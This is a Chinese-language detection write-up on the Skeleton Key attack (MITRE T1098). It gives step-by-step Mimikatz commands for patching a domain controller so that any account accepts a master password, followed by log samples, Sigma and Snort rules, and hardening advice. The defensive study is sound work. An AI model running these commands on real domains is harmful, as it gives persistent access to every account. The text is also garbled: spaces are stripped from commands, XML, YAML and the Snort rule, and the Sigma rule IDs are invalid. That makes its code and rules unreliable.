# T1098-Win-万能密码

## 描述

万能密码（SkeletonKey）是一种账户操作技术（MITREATT&CKT1098），通过在域控制器上注入恶意补丁（如使用Mimikatz的`misc::skeleton`功能），为域内所有用户账户设置一个通用密码（如默认的“mimikatz”），从而允许攻击者以任意域用户身份进行身份验证，而无需知道原始密码。此技术可实现持久化访问和权限提升，绕过标准认证机制。执行SkeletonKey攻击需要域控制器上的管理员权限，攻击者通常利用已获得的域管理员凭据或漏洞（如MS14-068）实施。

## 测试案例

**测试环境**：
- 域控制器：WindowsServer2008R2（未打补丁，易受攻击）
- 域内主机：Windows7/10
- 工具：Mimikatz
- 要求：域管理员权限、域环境（如xiaomi.org）、启用Windows安全日志审计
- 域用户：普通用户（xiaomi）、管理员（administrator）

**测试准备**：
1. 获取域管理员权限（通过漏洞利用、凭据窃取等）。
2. 启用Windows安全日志审计（组策略：计算机配置>策略>Windows设置>安全设置>本地策略>审核策略>账户管理、进程跟踪）。
3. 下载Mimikatz（<https://github.com/gentilkiwi/mimikatz>）并确保域内主机与域控制器网络连通。
4. 验证域控制器未打补丁（如KB3011780，针对MS14-068）。

**测试步骤**：
1. **验证普通用户无权限访问域控制器**（域内主机）：
   ```cmd
   dir\\dc.xiaomi.org\c$
   ```
   预期输出：
   ```
   dir:Accessisdenied.
   ```
2. **使用域管理员账户测试原始密码**（域内主机）：
   ```cmd
   netuse\\dc.xiaomi.org\ipc$"admin.098"/user:xiaomi\administrator
   dir\\dc.xiaomi.org\c$
   ```
   预期输出：成功列出C$目录。
3. **在域控制器上注入SkeletonKey**（域控制器，管理员权限）：
   ```cmd
   mimikatz.exe"privilege::debug""misc::skeleton"exit
   ```
   预期输出：
   ```
   [KDC]data
   [KDC]struct
   [KDC]keyspatchOK
   [RC4]functions
   [RC4]initpatchOK
   [RC4]decryptpatchOK
   ```
4. **使用SkeletonKey验证访问**（域内主机，普通用户）：
   ```cmd
   netuse\\dc.xiaomi.org\ipc$"mimikatz"/user:xiaomi\administrator
   dir\\dc.xiaomi.org\c$
   ```
   预期输出：成功列出C$目录，表明SkeletonKey生效。
5. **清理网络连接**：
   ```cmd
   netuse\\dc.xiaomi.org\ipc$/del/y
   ```

**参考资源**：
- MimikatzSkeletonKey：<https://adsecurity.org/?p=551>
- 内网渗透技术：<https://www.bbsmax.com/A/A7zgkjRPz4/>

## 检测日志

**数据来源**：
- **Windows安全日志**：
  - 事件ID4673：调用权限的服务（如SeDebugPrivilege）
  - 事件ID4611：受信任的登录进程注册
  - 事件ID4688：新进程创建（Mimikatz执行）
  - 事件ID4689：进程退出
  - 事件ID4624：异常登录（使用SkeletonKey）
- **Sysmon日志**（可选）：
  - 事件ID1：进程创建（mimikatz.exe）
  - 事件ID7：映像加载（lsasrv.dll补丁）
- **网络流量**：
  - 捕获异常Kerberos（88/TCP）或SMB（445/TCP）流量，关注多用户使用相同密码的登录尝试。

**关键日志字段**：
- 事件ID4673：`PrivilegeName`（SeDebugPrivilege）、`ProcessName`（mimikatz.exe）
- 事件ID4688：`ProcessName`（mimikatz.exe）、`CommandLine`
- 事件ID4624：`TargetUserName`（高权限用户如administrator）、`AuthenticationPackageName`（Kerberos/NTLM）

## 测试复现

**环境配置**：
- 域控制器：WindowsServer2008R2（dc.xiaomi.org）
- 域内主机：Windows7
- 工具：Mimikatz（x64）
- 用户：普通用户（xiaomi）、管理员（administrator，密码admin.098）
- 域：xiaomi.org

**复现步骤**：
1. **验证普通用户权限**（域内主机）：
   ```cmd
   C:\Users\xiaomi>dir\\dc.xiaomi.org\c$
   dir:Accessisdenied.
   ```
2. **使用管理员原始密码验证**（域内主机）：
   ```cmd
   C:\Users\xiaomi>netuse\\dc.xiaomi.org\ipc$"admin.098"/user:xiaomi\administrator
   命令成功完成。
   C:\Users\xiaomi>dir\\dc.xiaomi.org\c$
   2009/07/1411:20<DIR>PerfLogs
   2020/03/2315:24<DIR>ProgramFiles
   ...
   ```
3. **注入SkeletonKey**（域控制器）：
   ```cmd
   C:\Users\Administrator\Desktop\mimikatz_trunk\x64>mimikatz.exe"privilege::debug""misc::skeleton"exit
   Privilege'20'OK
   [KDC]data
   [KDC]struct
   [KDC]keyspatchOK
   [RC4]functions
   [RC4]initpatchOK
   [RC4]decryptpatchOK
   ```
4. **使用SkeletonKey登录**（域内主机）：
   ```cmd
   C:\Users\xiaomi>netuse\\dc.xiaomi.org\ipc$"mimikatz"/user:xiaomi\administrator
   命令成功完成。
   C:\Users\xiaomi>dir\\dc.xiaomi.org\c$
   2009/07/1411:20<DIR>PerfLogs
   2020/03/2315:24<DIR>ProgramFiles
   ...
   ```
5. **清理连接**：
   ```cmd
   C:\Users\xiaomi>netuse\\dc.xiaomi.org\ipc$/del/y
   \\dc.xiaomi.org\ipc$已经删除。
   ```

## 测试留痕

**Windows安全日志（域控制器）**：
- **事件ID4673**（调用权限服务）：
  ```xml
  <Event>
    <EventData>
      <DataName="PrivilegeName">SeDebugPrivilege</Data>
      <DataName="ProcessName">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe</Data>
      <DataName="SubjectUserName">Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID4688**（新进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="ProcessName">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe</Data>
      <DataName="CommandLine">mimikatz.exe"privilege::debug""misc::skeleton"exit</Data>
      <DataName="SubjectUserName">Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID4689**（进程退出）：
  ```xml
  <Event>
    <EventData>
      <DataName="ProcessName">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe</Data>
      <DataName="SubjectUserName">Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID4624**（异常登录，SkeletonKey）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">administrator</Data>
      <DataName="TargetDomainName">XIAOMI</Data>
      <DataName="LogonType">3</Data>
      <DataName="AuthenticationPackageName">NTLM</Data>
      <DataName="WorkstationName">CLIENT-PC</Data>
    </EventData>
  </Event>
  ```

**Sysmon日志**（可选）：
- **事件ID1**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="Image">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe</Data>
      <DataName="CommandLine">mimikatz.exe"privilege::debug""misc::skeleton"exit</Data>
      <DataName="User">XIAOMI\Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID7**（映像加载，lsasrv.dll补丁）：
  ```xml
  <Event>
    <EventData>
      <DataName="ImageLoaded">C:\Windows\System32\lsasrv.dll</Data>
      <DataName="Image">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe</Data>
    </EventData>
  </Event>
  ```

## 检测规则/思路

### Sigma规则

**规则一：检测MimikatzSkeletonKey注入**：
```yaml
title:MimikatzSkeletonKey注入检测
id:f6a7b8c9-0d1e-4f7a-ag2b-9c0d1e2f3c4d
status:stable
description:检测Mimikatz执行misc::skeleton命令注入SkeletonKey的行为
references:
  -https://attack.mitre.org/techniques/T1098/
  -https://adsecurity.org/?p=551
tags:
  -attack.persistence
  -attack.t1098
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    EventID|in:
      -4688
      -1
    Image|endswith:'\mimikatz.exe'
    CommandLine|contains:'misc::skeleton'
  condition:selection
fields:
  -ComputerName
  -User
  -CommandLine
  -Image
falsepositives:
  -安全研究或合法测试工具使用
level:critical
```

**规则二：检测SkeletonKey异常登录**：
```yaml
title:SkeletonKey异常登录检测
id:g7b8c9d0-1e2f-4g8b-bh3c-0d1e2f3g4d5e
status:stable
description:检测使用SkeletonKey（如默认密码mimikatz）进行的异常登录行为
references:
  -https://attack.mitre.org/techniques/T1098/
tags:
  -attack.persistence
  -attack.t1098
logsource:
  category:security
  product:windows
detection:
  selection_4624:
    EventID:4624
    LogonType:3
    AuthenticationPackageName|in:
      -NTLM
      -Kerberos
    TargetUserName|in:
      -'administrator'
      -'krbtgt'
      -'DomainAdmins'
  selection_4673:
    EventID:4673
    PrivilegeName:'SeDebugPrivilege'
  timeframe:5s
  condition:selection_4624andselection_4673
fields:
  -EventID
  -TargetUserName
  -TargetDomainName
  -WorkstationName
  -PrivilegeName
falsepositives:
  -管理员合法高权限登录
level:high
```

**规则优化说明**：
- 规则一：聚焦Mimikatz执行`misc::skeleton`，通过事件ID4688/1和命令行参数精确检测。
- 规则二：结合事件ID4624（异常登录）和4673（SeDebugPrivilege调用），捕获SkeletonKey使用后的高权限登录。
- 设置5秒时间窗口，确保事件关联性，降低误报。

### 检测思路

1. **日志监控**：
   - 监控事件ID4688/1，检测`mimikatz.exe`执行或`misc::skeleton`命令。
   - 监控事件ID4624，关注高权限账户（如administrator）的异常登录（LogonType3，NTLM/Kerberos）。
   - 检查事件ID4673，关注`SeDebugPrivilege`调用。

2. **行为分析**：
   - 检测多用户使用相同密码（如“mimikatz”）登录高权限账户。
   - 监控短时间内多个账户的异常登录行为（事件ID4624）。

3. **Sysmon增强**：
   - 使用事件ID1检测Mimikatz进程创建。
   - 事件ID7监控`lsasrv.dll`加载，捕获KDC服务补丁行为。

4. **网络监控**：
   - 捕获Kerberos（88/TCP）或SMB（445/TCP）流量，检测多用户使用相同凭据的异常模式。
   - 示例Snort规则：
     ```snort
     alerttcpanyany->any445(msg:"SkeletonKeySMBLoginAttempt";content:"mimikatz";sid:1000004;)
     ```

## 防御建议

1. **补丁管理**：
   - 安装KB3011780补丁，修复MS14-068等Kerberos漏洞。
   - 定期检查域控制器和主机补丁状态。

2. **权限最小化**：
   - 限制域管理员账户使用，仅授权必要人员。
   - 使用组策略禁用非管理员对域控制器的远程访问（如IPC$、C$）。

3. **日志与监控**：
   - 启用事件ID4624、4673、4688、4689的成功和失败审计。
   - 部署Sysmon，监控Mimikatz进程和`lsasrv.dll`加载。
   - 使用SIEM（如Splunk）关联异常登录和进程行为。

4. **多因素认证（MFA）**：
   - 为域管理员账户启用MFA，防止凭据滥用。
   - 对高权限操作（如KDC修改）实施二次验证。

5. **主动防御**：
   - 部署诱捕账户（HoneyAccounts），监控异常高权限登录。
   - 使用EDR工具检测Mimikatz或异常进程行为。

## 参考推荐

- MITREATT&CK:AccountManipulation(T1098)  
  <https://attack.mitre.org/techniques/T1098/>
- MimikatzSkeletonKey攻击分析  
  <https://adsecurity.org/?p=551>
- Windows账户管理命令  
  <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/net-user>
- ActiveDirectory安全最佳实践  
  <https://adsecurity.org/?p=1684>